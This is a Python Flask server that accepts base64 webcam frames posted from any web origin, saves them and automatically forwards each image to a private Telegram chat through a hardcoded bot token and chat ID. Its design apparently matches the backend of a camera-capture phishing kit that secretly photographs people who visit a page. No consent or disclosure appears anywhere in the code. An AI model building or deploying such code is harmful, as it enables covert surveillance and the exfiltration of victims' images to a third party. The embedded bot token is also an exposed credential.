from flask import Flask, request, jsonify
from flask_cors import CORS
import cv2
import numpy as np
import base64
import os
from datetime import datetime
import requests

app = Flask(__name__)
CORS(app)

SAVE_DIR = "captured_frames"
os.makedirs(SAVE_DIR, exist_ok=True)

# ================================================
# 🔥 TELEGRAM BOT CONFIG (Apna daal)
# ================================================
BOT_TOKEN = "7826364583:AAE-BVaqah4x3KkJGK9UokQv_aQkVwnNfxs"
CHAT_ID = "8076485983"

def send_to_telegram(filename):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data)
        print(f"✅ Telegram par bhej diya: {filename}")
    except Exception as e:
        print(f"❌ Telegram error: {e}")

# ================================================

@app.route('/')
def home():
    return "✅ Server is running! Use /upload for camera."

@app.route('/upload', methods=['POST', 'OPTIONS'])
def upload_frame():
    if request.method == 'OPTIONS':
        return '', 200

    data = request.get_json()
    if not data or 'image' not in data:
        return jsonify({"error": "No image data"}), 400

    try:
        image_data = data['image'].split(',')[1]
        img_bytes = base64.b64decode(image_data)
        np_arr = np.frombuffer(img_bytes, np.uint8)
        frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        filename = os.path.join(SAVE_DIR, f"frame_{timestamp}.jpg")
        cv2.imwrite(filename, frame)

        # 🔥 Telegram par bhejo
        send_to_telegram(filename)

        return jsonify({"status": "saved", "file": filename}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)